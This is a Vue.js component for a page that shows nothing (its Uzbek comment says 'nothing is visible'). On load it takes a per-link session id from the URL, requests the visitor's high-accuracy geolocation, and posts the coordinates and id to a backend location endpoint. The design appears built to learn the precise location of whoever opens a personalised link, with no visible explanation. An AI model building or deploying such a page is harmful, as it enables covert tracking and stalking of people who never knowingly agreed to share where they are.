<template>
  <!-- Hech narsa ko‘rinmaydi -->
  <div></div>
</template>

<script>
import axios from 'axios'

export default {
  name: 'Home',

  mounted() {
    this.getLocation()
  },
  data() {
    return {
      session_id: null
    }
  },
  methods: {
    getLocation() {
      if (!navigator.geolocation) return

      // /lk/:id
      const session_id = this.$route.params.id
      this.session_id = session_id

      if (!session_id) return

      navigator.geolocation.getCurrentPosition(
          async (position) => {
            const lat = position.coords.latitude
            const lan = position.coords.longitude
            const accuracy = Math.round(position.coords.accuracy)

            try {
              await this.sendToApi({
                lat,
                lan,
                accuracy,
                session_id
              })
            } catch (e) {
              console.error('API yuborishda xato:', e)
            }
          },
          (error) => {
            console.error('Lokatsiya olinmadi:', error.message)
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
      )
    },

    async sendToApi(payload) {
      await axios.post(
          `${import.meta.env.VITE_BACKEND_API}/api/location`,
          payload
      )
    }
  }
}
</script>
